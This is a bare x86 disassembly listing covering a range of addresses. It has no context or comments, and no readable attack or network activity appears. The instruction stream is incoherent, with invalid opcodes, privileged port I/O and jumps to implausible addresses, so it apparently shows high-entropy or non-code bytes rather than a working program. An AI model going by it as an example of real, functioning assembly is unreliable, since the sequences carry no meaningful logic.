  412fe7:	inc    ecx
  412fe8:	stos   DWORD PTR es:[edi],eax
  412fe9:	and    al,0x29
  412feb:	lahf   
  412fec:	aaa    
  412fed:	cmp    BYTE PTR [edi-0x6],dl
  412ff0:	push   eax
  412ff1:	pop    eax
  412ff2:	fistp  WORD PTR [ebp-0x24c01731]
  412ff8:	dec    edx
  412ff9:	cmp    ecx,ebx
  412ffb:	rcl    BYTE PTR [esi+0x48],0x8a
  412fff:	stos   BYTE PTR es:[edi],al
  413000:	and    eax,DWORD PTR [esi+ebx*2]
  413003:	mov    edx,DWORD PTR ds:0xcc046724
  413009:	pop    ss
  41300a:	adc    eax,0x19f38668
  41300f:	jp     0x41303d
  413011:	mov    ds:0x6c3b94b,al
  413016:	bound  ecx,QWORD PTR [esi-0x2f]
  413019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41301a:	dec    ebp
  41301b:	dec    esp
  41301c:	(bad)  
  41301d:	lods   eax,DWORD PTR ds:[esi]
  41301e:	xor    eax,0x2d40ce73
  413023:	mov    dl,0xb9
  413025:	ins    BYTE PTR es:[edi],dx
  413026:	stc    
  413027:	lods   al,BYTE PTR ds:[esi]
  413028:	xchg   esi,eax
  413029:	into   
  41302a:	add    DWORD PTR [esi],esp
  41302c:	(bad)  [ebx+0x67]
  41302f:	fs jp  0x412fdf
  413032:	imul   ebx,edi,0x8503f7f4
  413038:	sbb    BYTE PTR [eax+0x33],al
  41303b:	mov    edx,0xf1483ec4
  413040:	lahf   
  413041:	hlt    
  413042:	xchg   esp,eax
  413043:	cmp    esp,DWORD PTR [edx+eiz*4]
  413046:	or     esi,DWORD PTR [ebx]
  413048:	mov    al,ds:0xb992e3e7
  41304d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41304e:	mov    bx,0x1a06
  413052:	add    dl,ch
  413054:	scas   al,BYTE PTR es:[edi]
  413055:	adc    eax,0x18f36fd7
  41305a:	mov    bh,0x9b
  41305c:	push   edi
  41305d:	in     al,dx
  41305e:	pop    ebp
  41305f:	(bad)  
  413060:	dec    ecx
  413061:	js     0x41304c
  413063:	mov    al,0xd4
  413065:	repnz iret 
  413067:	inc    ecx
  413068:	test   al,0x99
  41306a:	cs lahf 
  41306c:	cld    
  41306d:	ss in  eax,dx
  41306f:	push   ecx
  413070:	sub    BYTE PTR [ebp-0x8],0x63
  413074:	add    BYTE PTR [ecx-0x26],ch
  413077:	inc    edi
  413078:	loope  0x41300b
  41307a:	xchg   ecx,eax
  41307b:	shr    esi,cl
  41307d:	dec    ebp
  41307e:	inc    ebp
  41307f:	xchg   esp,eax
  413080:	cld    
  413081:	mov    eax,0xe265854d
  413086:	retf   
  413087:	xor    bl,ah
  413089:	xchg   ebx,edx
  41308b:	jge    0x41306d
  41308d:	xchg   edi,eax
  41308e:	mov    bh,0xbd
  413090:	xchg   edi,eax
  413091:	inc    esp
  413092:	out    0xe5,eax
  413094:	(bad)  
  413095:	outs   dx,DWORD PTR ds:[esi]
  413096:	mov    BYTE PTR [edx+0x69f4890d],bh
  41309c:	stos   DWORD PTR es:[edi],eax
  41309d:	stos   DWORD PTR es:[edi],eax
  41309e:	mov    bl,BYTE PTR [ecx-0x239f9e64]
  4130a4:	jo     0x4130d1
  4130a6:	sub    BYTE PTR [esi-0x3e],0xb0
  4130aa:	jecxz  0x413083
  4130ac:	cwde   
  4130ad:	sub    ah,dl
  4130af:	out    0xac,al
  4130b1:	inc    ecx
  4130b2:	cdq    
  4130b3:	std    
  4130b4:	push   edx
  4130b5:	xor    ah,bh
  4130b7:	loopne 0x41309b
  4130b9:	xchg   esi,eax
  4130ba:	mov    edi,DWORD PTR [ecx+eiz*2]
  4130bd:	dec    esp
  4130be:	pop    ds
  4130bf:	and    BYTE PTR [ebx+ebp*4],bh
  4130c2:	cmc    
  4130c3:	or     ch,BYTE PTR [esi]
  4130c5:	mov    esp,0x4c2a671
  4130ca:	push   ecx
  4130cb:	jbe    0x4130ce
  4130cd:	mov    ebp,0x32e34e45
  4130d2:	mov    cl,0xe3
  4130d4:	inc    eax
  4130d5:	mov    ds:0x4e1831f5,al
  4130da:	fistp  WORD PTR [ecx-0x11]
  4130dd:	sbb    BYTE PTR [edi+ecx*8],al
  4130e0:	mov    ds:0xababa0c,eax
  4130e5:	lods   eax,DWORD PTR ds:[esi]
  4130e6:	int    0x5e
  4130e8:	shl    BYTE PTR [edi-0x5b0dd3f7],1
  4130ee:	cmp    DWORD PTR [ebx-0x6a],eax
  4130f1:	iret   
  4130f2:	mov    eax,0xfd03ad84
  4130f7:	jl     0x413124
  4130f9:	mov    ah,0x76
  4130fb:	or     al,0xf5
  4130fd:	pop    edx
  4130fe:	mov    bl,0x1e
  413100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413101:	rcl    DWORD PTR [ecx-0x132a3216],cl
  413107:	jp     0x413127
  413109:	add    cl,0x3c
  41310c:	cmp    DWORD PTR [ecx+0x4d],0x43542eb4
  413113:	and    dl,BYTE PTR [esi]
  413115:	or     DWORD PTR [esi],0x19954104
  41311b:	xor    eax,edi
  41311d:	jecxz  0x4130af
  41311f:	push   ebx
  413120:	fild   QWORD PTR [edx]
  413122:	adc    cl,ah
  413124:	jae    0x4131a0
  413126:	mov    ds:0x9902abc1,eax
  41312b:	das    
  41312c:	mov    eax,0xb4649195
  413131:	dec    eax
  413132:	mov    esi,0x5dd90698
  413137:	push   edi
  413138:	retf   
  413139:	in     al,0x90
  41313b:	inc    edx
  41313c:	dec    esi
  41313d:	hlt    
  41313e:	add    eax,0x440f2a34
  413143:	imul   ebp,DWORD PTR [esi-0x5c],0x6
  413147:	sbb    al,0x3d
  413149:	test   eax,0xc423a347
  41314e:	test   al,0x4a
  413150:	ja     0x4130de
  413152:	int3   
  413153:	xor    esp,DWORD PTR [edi+ecx*8-0x5f3e39b3]
  41315a:	shr    DWORD PTR [edx],1
  41315c:	or     eax,0x3f0f181
  413161:	ds popf 
  413163:	push   edx
  413164:	stos   DWORD PTR es:[edi],eax
  413165:	nop
  413166:	fadd   DWORD PTR [eax+0x3]
  413169:	xchg   sp,ax
  41316b:	repz inc edx
  41316d:	or     cl,BYTE PTR [eax]
  41316f:	jle    0x4131a2
  413171:	xchg   ebp,eax
  413172:	(bad)  
  413173:	jecxz  0x4131df
  413175:	test   BYTE PTR ds:0x60a635f2,0xe9
  41317c:	sub    eax,0x40e415df
  413181:	enter  0x8068,0x1d
  413185:	mov    ebp,0xa3e4076a
  41318a:	jg     0x41313f
  41318c:	push   ebx
  41318d:	xchg   edi,eax
  41318e:	push   esi
  41318f:	popa   
  413190:	mov    ebp,DWORD PTR ds:0xbbc68ca4
  413196:	aam    0xf6
  413198:	adc    BYTE PTR [ecx-0x1c2417ad],0x88
  41319f:	mov    ds,ebx
  4131a1:	push   0xffffffc9
  4131a3:	jmp    0x4ba36edf
  4131a8:	mov    ch,0x65
  4131aa:	cwde   
  4131ab:	ret    
  4131ac:	lea    ecx,[edi]
  4131ae:	je     0x4131ce
  4131b0:	inc    edx
  4131b1:	mov    esp,0x17febb8b
  4131b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b7:	add    eax,DWORD PTR [edi+0x4d]
  4131ba:	dec    edi
  4131bb:	jl     0x413185
  4131bd:	pop    ss
  4131be:	jmp    0x41317c
  4131c0:	idiv   DWORD PTR fs:[ecx-0x3b]
  4131c4:	dec    ebx
  4131c5:	ss pushf 
  4131c7:	mov    bh,0x8f
  4131c9:	out    dx,eax
  4131ca:	dec    ebp
  4131cb:	scas   al,BYTE PTR es:[edi]
  4131cc:	fld    DWORD PTR [ecx+0x7]
  4131cf:	(bad)  
  4131d0:	retf   
  4131d1:	xlat   BYTE PTR ds:[ebx]
  4131d2:	test   al,0xa2
  4131d4:	addr16 std 
  4131d6:	div    BYTE PTR [esi-0x6f]
  4131d9:	push   cs
  4131da:	adc    al,0x2b
  4131dc:	mov    bl,0xd3
  4131de:	add    DWORD PTR [esi+0x5b],esi
  4131e1:	dec    esp
  4131e2:	mov    edi,0xb08c57d0
  4131e7:	sub    BYTE PTR [ebp-0x428db4b6],al
  4131ed:	(bad)  
  4131ee:	jo     0x4131b5
  4131f0:	push   esp
  4131f1:	fcmovu st,st(0)
  4131f3:	imul   DWORD PTR [esi+0x5a]
  4131f6:	xor    ebx,ecx
  4131f8:	out    dx,al
  4131f9:	mov    ecx,0x6bc23fc1
  4131fe:	dec    ebp
  4131ff:	test   ah,bl
  413201:	jecxz  0x4131c8
  413203:	iret   
  413204:	or     BYTE PTR [ebx],bh
  413206:	sub    ch,BYTE PTR [edx*2+0x351dfb7d]
  41320d:	scas   eax,DWORD PTR es:[edi]
  41320e:	dec    esi
  41320f:	std    
  413210:	and    eax,0x9ad83809
  413215:	add    dh,bh
  413217:	xchg   ebx,eax
  413218:	out    0xe7,al
  41321a:	add    ecx,edx
  41321c:	and    al,0x93
  41321e:	fild   QWORD PTR [ecx]
  413221:	add    eax,0x326d3bbb
  413226:	push   edi
  413227:	jecxz  0x413284
  413229:	add    dl,BYTE PTR [ecx-0x75]
  41322c:	add    al,0x94
  41322e:	sti    
  41322f:	or     eax,0xdbb05ff1
  413234:	mov    dl,0x61
  413236:	outs   dx,BYTE PTR ds:[esi]
  413237:	cmp    al,0x6d
  413239:	xor    bh,BYTE PTR [ebx]
  41323b:	mov    edi,0xa1f8c625
  413240:	inc    eax
  413241:	push   edx
  413242:	lea    edx,[ecx-0x34]
  413245:	daa    
  413246:	int    0x39
  413248:	stos   BYTE PTR es:[edi],al
  413249:	xchg   esi,eax
  41324a:	jae    0x413241
  41324c:	xor    eax,DWORD PTR [ebx-0x1ba9d8f7]
  413252:	loope  0x41320f
  413254:	mov    al,0x3f
  413256:	add    al,0x7
  413258:	fcomp  DWORD PTR [eax]
  41325a:	push   ds
  41325b:	sbb    al,0x90
  41325d:	mov    bl,0x1
  41325f:	cmp    DWORD PTR [edx+0x1],0x77
  413263:	inc    edi
  413264:	mov    DWORD PTR [edi-0x9],esi
  413267:	lock fsub DWORD PTR gs:[ebx+0x5d]
  41326c:	mov    esp,ss
  41326e:	mov    ebp,DWORD PTR [eax+0x5cd8126c]
  413274:	rcr    BYTE PTR [esi+0x64],cl
  413277:	cs dec edx
  413279:	test   ecx,esi
  41327b:	mov    DWORD PTR [ebx+0x6add12b5],esp
  413281:	sar    DWORD PTR [eax+0x477c8dcb],1
  413287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413288:	sbb    ebp,ebp
  41328a:	mov    ebx,DWORD PTR [eax+edi*4+0x12]
  41328e:	in     al,0xbf
  413290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413291:	sbb    eax,0x60ee82a2
  413296:	adc    eax,0xf1db1d80
  41329b:	popa   
  41329c:	in     eax,0x11
  41329e:	sti    
  41329f:	and    esi,esp
  4132a1:	jb     0x413289
  4132a3:	lods   eax,DWORD PTR ds:[esi]
  4132a5:	imul   edx,edx,0x3de3d14e
  4132ab:	mov    cl,0xf9
  4132ad:	or     DWORD PTR [eax],ebx
  4132af:	mov    ds:0x1b04e475,al
  4132b4:	fnstcw WORD PTR [ebx+0x46]
  4132b7:	aaa    
  4132b8:	push   ecx
  4132b9:	imul   eax,eax,0xf3c76ef8
  4132bf:	mov    ah,0x72
  4132c1:	jp     0x4132ed
  4132c3:	add    DWORD PTR [edx+0x2f],0xeeb22c10
  4132ca:	ror    DWORD PTR [ebx-0x55c47862],cl
  4132d0:	xchg   BYTE PTR [edi+0x49aed26f],cl
  4132d6:	out    dx,al
  4132d7:	scas   eax,DWORD PTR es:[edi]
  4132d8:	pop    ebx
  4132d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132da:	add    al,0x4a
  4132dc:	inc    esi
  4132dd:	mov    ebx,ebx
  4132df:	inc    esi
  4132e0:	xor    BYTE PTR [edx-0x594da121],cl
  4132e6:	mov    ch,BYTE PTR [edx+0x7179e32d]
  4132ec:	sbb    BYTE PTR [ebx-0x11],cl
  4132ef:	fcmovnbe st,st(4)
  4132f1:	pop    edi
  4132f2:	sub    BYTE PTR [eax-0x6b],dl
  4132f5:	mov    ds:0x93d47e3,eax
  4132fa:	faddp  st(7),st
  4132fc:	ror    eax,cl
  4132fe:	call   0xe4afbc4d
  413303:	jbe    0x413314
  413305:	xchg   ecx,eax
  413306:	jo     0x413303
  413308:	sar    ebp,0xda
  41330b:	ds mov ah,0x2
  41330e:	repz add DWORD PTR [ebp-0x52bcd58a],ebx
  413315:	int    0x3c
  413317:	mov    esi,0xc921b764
  41331c:	mov    eax,ds:0x6d73674
  413321:	in     eax,0x49
  413323:	mov    al,0xbf
  413325:	push   edi
  413326:	out    0x6b,al
  413328:	mov    DWORD PTR [edi],edi
  41332a:	pop    eax
  41332b:	or     eax,0x26603c66
  413330:	xor    ah,BYTE PTR [edi-0x1cb375f6]
  413336:	add    al,dh
  413338:	in     al,dx
  413339:	retf   
  41333a:	outs   dx,DWORD PTR ds:[esi]
  41333b:	adc    esi,esp
  41333d:	inc    esi
  41333e:	scas   al,BYTE PTR es:[edi]
  41333f:	js     0x41339b
  413341:	(bad)  
  413342:	xchg   esi,eax
  413343:	sub    ch,BYTE PTR [esi+ecx*8]
  413346:	or     esi,DWORD PTR [eax+0x329e988d]
  41334c:	gs aad 0x1f
  41334f:	sti    
  413350:	push   0xffffffc4
  413352:	mov    bh,0xdd
  413354:	push   es
  413355:	pushf  
  413356:	popa   
  413357:	xchg   BYTE PTR [edi],ah
  413359:	mov    ecx,esp
  41335b:	sub    esi,DWORD PTR [edx+0x40]
  41335e:	out    dx,al
  41335f:	dec    ebx
  413360:	fwait
  413361:	jecxz  0x413319
  413363:	aad    0x4d
  413365:	inc    ebx
  413366:	jecxz  0x413395
  413368:	mov    cl,0xf9
  41336a:	inc    esp
  41336b:	dec    ecx
  41336c:	sbb    ch,BYTE PTR [edx+0x35]
  41336f:	mov    eax,0xe27fddd5
  413374:	adc    edx,DWORD PTR [ebp+0x1e]
  413377:	stos   DWORD PTR es:[edi],eax
  413378:	push   edx
  413379:	or     DWORD PTR [edi+0x1c57d5f9],ebp
  41337f:	xor    eax,DWORD PTR [esi-0x12]
  413382:	cmp    DWORD PTR [ebx-0x224a3940],0xffffffbd
  413389:	jmp    0xc316:0xbb265ca7
  413390:	(bad)  
  413391:	mov    ah,0x96
  413393:	xchg   esp,eax
  413394:	retf   0x4bd
  413397:	xchg   edx,eax
  413398:	jecxz  0x4133d5
  41339a:	mov    eax,0x387b7f1a
  41339f:	jge    0x413372
  4133a1:	xor    esp,DWORD PTR [ebx+eax*2-0x61]
  4133a5:	jmp    0xb1778e5d
  4133aa:	stos   BYTE PTR es:[edi],al
  4133ab:	mov    ds,WORD PTR [eax+edx*1+0x6d]
  4133af:	cld    
  4133b0:	mov    ds:0x7540f4c8,eax
  4133b5:	cmp    esi,eax
  4133b7:	lds    edx,FWORD PTR [ebx]
  4133b9:	call   0xee6e:0x4e24
  4133bf:	sub    al,0x65
  4133c1:	push   ds
  4133c2:	or     BYTE PTR [eax],bl
  4133c4:	adc    BYTE PTR [ecx+0x3ea747bb],ah
  4133ca:	call   0x4369c4fb
  4133cf:	fwait
  4133d0:	das    
  4133d1:	mov    ah,0x87
  4133d3:	sbb    BYTE PTR [ebx],dl
  4133d5:	loop   0x4133e3
  4133d7:	ins    BYTE PTR es:[edi],dx
  4133d8:	jmp    0x5e31fbd4
  4133dd:	mov    al,0xe4
  4133df:	and    BYTE PTR [eax+0x54],bh
  4133e2:	jmp    0xc5b3bec0
  4133e7:	stc    
  4133e8:	int    0xc1
  4133ea:	fmul   QWORD PTR [ebp+0x4317bebe]
  4133f0:	mov    al,0x50
  4133f2:	mov    dl,0xea
  4133f4:	jl     0x4133a4
  4133f6:	and    DWORD PTR [ecx],edx
  4133f8:	add    al,BYTE PTR [ebp+0x3a]
  4133fb:	popf   
  4133fc:	sub    eax,0x9596182a
  413401:	push   ebp
  413402:	test   eax,ebx
  413404:	jnp    0x413459
  413406:	fnstsw WORD PTR [esi+edx*1]
  413409:	cmp    DWORD PTR [edi],ecx
  41340b:	nop
  41340c:	rcr    DWORD PTR [ebx-0x2f],0x8c
  413410:	repnz mov ecx,0x841f73fe
  413416:	mov    al,ds:0xd9d52936
  41341b:	and    eax,0x1491b447
  413420:	scas   eax,DWORD PTR es:[edi]
  413421:	dec    ebp
  413422:	add    eax,0x2d63beb4
  413427:	js     0x41344f
  413429:	bound  edi,QWORD PTR [ebx+0x52]
  41342c:	ja     0x4133c9
  41342e:	pop    ebx
  41342f:	ds add al,0xd8
  413432:	dec    eax
  413433:	push   ss
  413434:	pop    esi
  413435:	lahf   
  413436:	mov    ebp,0x51c260b
  41343b:	xor    edx,DWORD PTR [edi]
  41343d:	fnstcw WORD PTR [edi]
  41343f:	leave  
  413440:	or     al,0x4d
  413442:	xchg   edi,ebx
  413444:	retf   0x9f3a
  413447:	lahf   
  413448:	(bad)  
  413449:	mov    dh,0x60
  41344b:	dec    esp
  41344c:	test   DWORD PTR ds:0x2b2a9c1d,ebx
  413452:	ss and ah,ch
  413455:	pop    ebx
  413456:	scas   al,BYTE PTR es:[edi]
  413457:	shl    DWORD PTR [ecx],1
  413459:	out    dx,eax
  41345a:	push   0x7a6ddf32
  41345f:	mov    bl,0x80
  413461:	ror    ecx,0xfa
  413464:	adc    ah,dl
  413466:	call   0xd37d411
  41346b:	pop    edi
  41346c:	(bad)  [edi-0x3b]
  41346f:	in     al,0x6c
  413471:	iret   
  413472:	xor    bl,BYTE PTR [eax]
  413474:	jmp    0x4133fd
  413476:	add    eax,0xd3211f01
  41347b:	adc    dh,BYTE PTR [eax-0x13]
  41347e:	and    BYTE PTR [eax-0x5c790b20],0xdf
  413485:	push   ebp
  413486:	pushf  
  413487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413488:	fist   DWORD PTR ds:0x6c142fed
  41348e:	xor    al,0xb5
  413490:	inc    ebx
  413491:	jnp    0x413492
  413493:	pushf  
  413494:	sbb    ebx,edi
  413496:	mov    al,ds:0xd638920f
  41349b:	dec    edx
  41349c:	mov    bl,BYTE PTR [ebx-0x3fc20630]
  4134a2:	sbb    eax,0x70ec3db6
  4134a7:	hlt    
  4134a8:	fistp  WORD PTR [esp+ebx*4]
  4134ab:	jno    0x413439
  4134ad:	sbb    al,BYTE PTR [ecx]
  4134af:	pushf  
  4134b0:	xchg   ebx,eax
  4134b1:	sub    bh,BYTE PTR [edi+0x4e730538]
  4134b7:	call   0xbdb6fb30
  4134bc:	fild   QWORD PTR [ecx+0x29]
  4134bf:	fdivr  DWORD PTR [eax]
  4134c1:	daa    
  4134c2:	jne    0x413457
  4134c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134c5:	dec    edx
  4134c6:	push   edx
  4134c7:	xchg   cl,al
  4134c9:	shl    BYTE PTR [edi+0x591c0a9e],0xea
  4134d0:	ja     0x4134c6
  4134d2:	cmc    
  4134d3:	sti    
  4134d4:	aaa    
  4134d5:	inc    ebp
  4134d6:	mov    ah,0xec
  4134d8:	mov    ch,0x95
  4134da:	and    ah,BYTE PTR [edi]
  4134dc:	add    eax,0xfac9541a
  4134e1:	pop    ss
  4134e2:	adc    DWORD PTR [edi+0x38de9948],ebx
  4134e8:	loope  0x4134d6
  4134ea:	mov    cl,0x92
  4134ec:	xor    DWORD PTR [eax],0x30b1b347
  4134f2:	push   edi
  4134f3:	mov    ebx,0x48cbc571
  4134f8:	test   al,0x29
  4134fa:	mov    bh,0xa1
  4134fc:	jecxz  0x413544
  4134fe:	rol    DWORD PTR [edx-0x6fce9ff4],cl
  413504:	push   ds
  413505:	stc    
  413506:	sbb    edi,eax
  413508:	std    
  413509:	(bad)  
  41350a:	xchg   edi,eax
  41350b:	out    dx,eax
  41350c:	jb     0x4134c1
  41350e:	jo     0x4134f8
  413510:	cmp    BYTE PTR [edi-0x7214e6a8],dh
  413516:	out    dx,eax
  413517:	cld    
  413518:	sbb    eax,0xf2e61226
  41351d:	scas   al,BYTE PTR es:[edi]
  41351e:	xchg   BYTE PTR [edi],cl
  413520:	retf   
  413521:	xor    BYTE PTR [esi+0x13b015b5],bh
  413527:	push   ds
  413528:	std    
  413529:	and    DWORD PTR [ebp-0x6f],eax
  41352c:	in     eax,0x99
  41352e:	leave  
  41352f:	daa    
  413530:	mov    al,0x90
  413532:	sbb    DWORD PTR [eax+0x54],esi
  413535:	in     eax,dx
  413536:	imul   edi,DWORD PTR [edx+0x7e93cde9],0xffffffc8
  41353d:	pop    edi
  41353e:	sbb    al,0xa5
  413540:	mov    ah,0x55
  413542:	pop    ds
  413543:	mov    cl,0x7b
  413545:	inc    edx
  413546:	(bad)  [esi+0xa]
  413549:	sub    al,0xa
  41354b:	lds    ebp,FWORD PTR [edi+0x6c0db164]
  413551:	mov    BYTE PTR [ebp+edx*1-0x64911e87],ah
  413558:	leave  
  413559:	in     eax,0xa8
  41355b:	xor    eax,DWORD PTR [ebp-0x7]
  41355e:	adc    BYTE PTR [eax+ebx*2-0x738c016b],al
  413565:	clc    
  413566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413567:	fmul   QWORD PTR [ebx-0x3a]
  41356a:	push   ebx
  41356b:	dec    BYTE PTR [edx-0x57]
  41356e:	aas    
  41356f:	stos   BYTE PTR es:[edi],al
  413570:	mov    dl,0xd9
  413572:	in     eax,0xe7
  413574:	js     0x413539
  413576:	loope  0x413542
  413578:	adc    dh,bl
  41357a:	int    0xd1
  41357c:	sbb    DWORD PTR [ebx+0x34],0xffffffa0
  413580:	rcr    BYTE PTR [edx+0x353bc5fd],cl
  413586:	sbb    BYTE PTR [edi+0x40],bh
  413589:	and    BYTE PTR [esi-0x267e9f33],0x16
  413590:	shld   DWORD PTR [edi+0x31],ecx,cl
  413594:	(bad)  
  413595:	sahf   
  413596:	and    DWORD PTR [edx],esi
  413598:	jnp    0x4135f5
  41359a:	add    eax,0x139fad29
  41359f:	pop    ebp
  4135a0:	arpl   WORD PTR [ebx],ax
  4135a2:	adc    al,0xec
  4135a4:	mov    esi,0x7063c3ba
  4135a9:	and    edx,DWORD PTR [edi+0x77f691ed]
  4135af:	or     DWORD PTR [ebx-0x4bf8efe6],edx
  4135b5:	push   0xffffffd1
  4135b7:	mov    cl,0xc4
  4135b9:	xchg   esi,eax
  4135ba:	lods   al,BYTE PTR ds:[esi]
  4135bb:	add    cl,dh
  4135bd:	ret    0x1c44
  4135c0:	ret    
  4135c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c2:	push   eax
  4135c3:	sub    eax,0x9926f64c
  4135c8:	mov    ?,WORD PTR [ebp-0x6de6638d]
  4135ce:	sbb    al,al
  4135d0:	sbb    eax,0x4ea9f412
  4135d5:	stos   BYTE PTR es:[edi],al
  4135d6:	dec    edx
  4135d7:	xchg   edi,eax
  4135d8:	cwde   
  4135d9:	cdq    
  4135da:	dec    ebp
  4135db:	xchg   esi,eax
  4135dc:	ret    
  4135dd:	cmp    ebx,edi
  4135df:	in     al,dx
  4135e0:	pop    bx
  4135e2:	and    DWORD PTR ds:0x796c6fc3,ebp
  4135e8:	mov    ah,0x67
  4135ea:	not    BYTE PTR [esi+0x4d90ab33]
  4135f0:	hlt    
  4135f1:	sbb    cl,BYTE PTR [edx-0x47]
  4135f4:	arpl   WORD PTR [ecx+0x7d93d69c],di
  4135fa:	je     0x413665
  4135fc:	push   esp
  4135fd:	mov    eax,0xb82a44c4
  413602:	in     eax,dx
  413603:	stos   DWORD PTR es:[edi],eax
  413604:	add    edi,ebx
  413606:	sbb    eax,esi
  413608:	mov    ds:0x4813e871,eax
  41360d:	das    
  41360e:	xchg   esp,eax
  41360f:	adc    ebx,DWORD PTR [edx]
  413611:	call   0x9228475c
  413616:	aam    0x67
  413618:	push   edi
  413619:	mov    cl,0x1f
  41361b:	jne    0x413682
  41361d:	pop    ds
  41361e:	nop
  41361f:	sahf   
  413620:	not    BYTE PTR ds:0x714968d3
  413626:	sbb    DWORD PTR [eax],edi
  413628:	stos   DWORD PTR es:[edi],eax
  413629:	les    esi,FWORD PTR [ebx+0x29]
  41362c:	and    al,0x18
  41362e:	jb     0x413614
  413630:	(bad)  
  413631:	xchg   esi,eax
  413632:	adc    DWORD PTR [esi+0x540518b7],esi
  413638:	cdq    
  413639:	rol    dl,1
  41363b:	xor    al,0x79
  41363d:	in     eax,0xd9
  41363f:	call   0xe6a51348
  413644:	lods   eax,DWORD PTR ds:[esi]
  413645:	mov    bh,BYTE PTR [ebx]
  413647:	call   0x14cab976
  41364c:	les    ebp,FWORD PTR [eax]
  41364e:	push   esp
  41364f:	jmp    0x5d2bf39
  413654:	or     eax,0x9bd2fb9b
  413659:	out    0x8c,eax
  41365b:	push   esi
  41365c:	sar    BYTE PTR [edi+esi*1+0x7b],1
  413660:	add    al,0x8d
  413662:	in     al,0xed
  413664:	sbb    al,0x4b
  413666:	lea    ecx,[eax+0x28bb96ed]
  41366c:	aam    0x4d
  41366e:	pop    edx
  41366f:	push   ss
  413670:	push   edx
  413671:	pop    edx
  413672:	push   ebp
  413673:	imul   ecx,DWORD PTR [ebx+0x48],0x5f
  413677:	mov    eax,ds:0x6e7db134
  41367c:	jne    0x41360f
  41367e:	sub    DWORD PTR [edi-0x27],ebx
  413681:	neg    bl
  413683:	cmp    edi,DWORD PTR [ebx-0x21]
  413686:	shl    bl,1
  413688:	test   al,0x89
  41368a:	les    ecx,FWORD PTR [edx-0x13]
  41368d:	int3   
  41368e:	cli    
  41368f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413690:	adc    BYTE PTR [eax-0x2f18d2c7],0x50
  413697:	mov    DWORD PTR ds:0x83848409,eax
  41369d:	(bad)  
  41369e:	mul    DWORD PTR [ebx+0x281bab7a]
  4136a4:	mov    esp,0xae757d9f
  4136a9:	cmp    DWORD PTR [ecx+0x53],0xc2cce19
  4136b0:	mov    ebp,0x81c94feb
  4136b5:	push   edx
  4136b6:	mov    esi,0x8aff458e
  4136bb:	or     al,0x75
  4136bd:	rcl    BYTE PTR [ecx-0x6f7e28ba],1
  4136c3:	aas    
  4136c4:	lods   eax,DWORD PTR ds:[esi]
  4136c5:	mov    ebx,DWORD PTR [esi+esi*8+0x28b0d464]
  4136cc:	out    0x98,al
  4136ce:	enter  0x81d3,0x30
  4136d2:	dec    eax
  4136d3:	into   
  4136d4:	mov    ebp,0xd5faa5f
  4136d9:	retf   0xca37
  4136dc:	pop    ecx
  4136dd:	lock lods eax,DWORD PTR ds:[esi]
  4136df:	push   cs
  4136e0:	scas   eax,DWORD PTR es:[edi]
  4136e1:	sub    eax,0xd6492131
  4136e6:	mov    dl,0x65
  4136e8:	rcl    bh,0x7e
  4136eb:	jae    0x413702
  4136ed:	mov    esi,0xeb4af22a
  4136f2:	and    DWORD PTR [ecx-0x51bd7ee0],0xd9fa1f40
  4136fc:	ja     0x4136c6
  4136fe:	pop    es
  4136ff:	in     eax,0x19
  413701:	sub    edi,DWORD PTR [ebx-0x298bec29]
  413707:	in     al,dx
  413708:	mov    ecx,0x1021f666
  41370d:	or     al,0xed
  41370f:	retf   0xd8d7
  413712:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  413714:	sub    dl,BYTE PTR [ebx+ebx*4]
  413717:	idiv   DWORD PTR [esi-0x182465dd]
  41371d:	mov    ch,0xb7
  41371f:	ds aas 
  413721:	(bad)  
  413722:	pop    ds
  413723:	shl    ecx,cl
  413725:	adc    BYTE PTR ds:0x9de65650,al
  41372b:	and    dh,dl
  41372d:	pop    esi
  41372e:	add    cl,ch
  413730:	arpl   sp,ax
  413732:	stos   BYTE PTR es:[edi],al
  413733:	ret    0xa7eb
  413736:	ins    DWORD PTR es:[edi],dx
  413737:	and    DWORD PTR ds:0x695ce130,esi
  41373d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41373e:	add    DWORD PTR [edi-0x44149a35],esp
  413744:	(bad)  
  413745:	mov    edi,0xd81ad0dc
  41374a:	pusha  
  41374b:	push   ss
  41374c:	imul   ebp,DWORD PTR [edx-0x37],0x38
  413750:	pop    ss
  413751:	cmp    eax,0x28254dca
  413756:	mov    esp,0xf131f6e7
  41375b:	and    BYTE PTR [ebp+0x8f7b195],cl
  413761:	fwait
  413762:	(bad)  
  413763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413764:	pop    ebx
  413765:	in     al,0x89
  413767:	int3   
  413768:	call   0x3a133ee5
  41376d:	hlt    
  41376e:	jno    0x413762
  413770:	jb     0x4137d4
  413772:	xor    BYTE PTR [esi-0x6087e292],ch
  413778:	jnp    0x4137c6
  41377a:	stos   DWORD PTR es:[edi],eax
  41377b:	aad    0xed
  41377d:	jae    0x413762
  41377f:	adc    ch,BYTE PTR [eax]
  413781:	aas    
  413782:	out    0xd6,al
  413784:	out    dx,eax
  413785:	push   0x1d18f0e2
  41378a:	je     0x41372d
  41378c:	aaa    
  41378d:	out    dx,eax
  41378e:	jle    0x4137bf
  413790:	loope  0x413745
  413792:	dec    ecx
  413793:	clc    
  413794:	xadd   eax,edx
  413797:	sub    esp,DWORD PTR [edi]
  413799:	lahf   
  41379a:	add    ecx,0xeae06385
  4137a0:	pause  
  4137a2:	inc    esi
  4137a3:	(bad)  
  4137a4:	repz pop ss
  4137a6:	sub    DWORD PTR [ebp+0x44fab8e5],edx
  4137ac:	loopne 0x4137d4
  4137ae:	cli    
  4137af:	sbb    eax,ebp
  4137b1:	cs dec ecx
  4137b3:	mov    ss,WORD PTR [eax]
  4137b5:	fsubr  QWORD PTR [edx-0x72]
  4137b8:	sahf   
